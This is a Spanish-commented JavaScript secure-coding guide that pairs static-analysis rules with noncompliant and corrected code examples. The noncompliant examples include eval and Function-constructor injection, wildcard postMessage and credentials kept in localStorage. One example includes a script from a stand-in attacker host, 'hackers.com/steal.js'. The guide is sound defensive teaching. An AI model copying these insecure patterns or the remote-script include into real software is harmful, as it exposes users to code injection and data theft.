// *************************
// CODIGO: javascript:S1442
// REGLA: "alert(...)" should not be used
// SEVERIDAD: Menor
// *************************

/* EJEMPLO DE INCUMPLIMIENTO */
if(unexpectedCondition)
{
  alert("Unexpected Condition");
}

/* EJEMPLO DE SOLUCIÓN */
// Eliminar el "alert"



// *************************
// CODIGO: javascript:Eval
// REGLA: Code should not be dynamically injected and executed
// SEVERIDAD: Crítica
// *************************

/* EJEMPLO DE INCUMPLIMIENTO */
var value = eval('obj.' + propName); 

/* EJEMPLO DE SOLUCIÓN */
var value = obj[propName];


// *************************
// CODIGO: javascript:S2228
// REGLA: Console logging should not be used
// SEVERIDAD: Menor
// *************************

/* EJEMPLO DE INCUMPLIMIENTO */
console.log(password_entered);

/* EJEMPLO DE SOLUCIÓN */
// Eliminar "console"



// *************************
// CODIGO: javascript:S2819
// REGLA: Cross-document messaging domains should be carefully restricted
// SEVERIDAD: Crítica
// *************************

/* EJEMPLO DE INCUMPLIMIENTO */
var myWindow = document.getElementById('myIFrame').contentWindow;
myWindow.postMessage(message, "*"); // Cómo sabes si lo que cargaste en "myIFrame" continúa allí?

/* EJEMPLO DE SOLUCIÓN */
var myWindow = document.getElementById('myIFrame').contentWindow;
myWindow.postMessage(message, "https://urlVerificada.com");

// *************************
// CODIGO: javascript:DebuggerStatement
// REGLA: Debugger statements should not be used
// SEVERIDAD: Menor
// *************************

/* EJEMPLO DE INCUMPLIMIENTO */
for (i = 1; i<5; i++) {
  // Print i to the Output window.
  Debug.write("loop index is " + i);
  // Wait for user to resume.
  debugger;
}

/* EJEMPLO DE SOLUCIÓN */
for (i = 1; i<5; i++) {
  // Print i to the Output window.
  Debug.write("loop index is " + i);
  
  // Eliminar "debugger"
}



// *************************
// CODIGO: javascript:S3523
// REGLA: Function constructors should not be used
// SEVERIDAD: Crítica
// *************************

/* EJEMPLO DE INCUMPLIMIENTO */
var obj =  new Function("return " + data)();

/* EJEMPLO DE SOLUCIÓN */
var obj = JSON.parse(data);



// *************************
// CODIGO: javascript:S3271
// REGLA: Local storage should not be used
// SEVERIDAD: Crítica
// *************************

/* EJEMPLO DE INCUMPLIMIENTO */
localStorage.setItem("login", login);
sessionStorage.setItem("sessionId", sessionId);

/* EJEMPLO DE SOLUCIÓN */
// Eliminar el uso de "localStorage" y "sessionStorage" o, al menos, encriptar la información:
// localStorage.setItem("login", encriptar(login));
// sessionStorage.setItem("sessionId", encriptar(sessionId));

// *************************
// CODIGO: javascript:S2611
// REGLA: Untrusted content should not be included
// SEVERIDAD: Crítica
// *************************

/* EJEMPLO DE INCUMPLIMIENTO */
function include(url) {
  var s = document.createElement("script");
  s.setAttribute("type", "text/javascript");
  s.setAttribute("src", url);
  document.body.appendChild(s);
}
include("http://hackers.com/steal.js")

/* EJEMPLO DE SOLUCIÓN */
// Usar rutas relativas o, al menos, seguras
include("js/steal.js")


// *************************
// CODIGO: javascript:S2817
// REGLA: Web SQL databases should not be used
// SEVERIDAD: Bloqueante
// *************************

/* EJEMPLO DE INCUMPLIMIENTO */
var db = window.openDatabase("myDb", "1.0", "Personal secrets stored here", 2*1024*1024);

/* EJEMPLO DE SOLUCIÓN */
// No utilizar bases de datos SQL Web.
// Utilizar una aplicación web con un servidor de base de datos con acceso sólo desde el servidor.
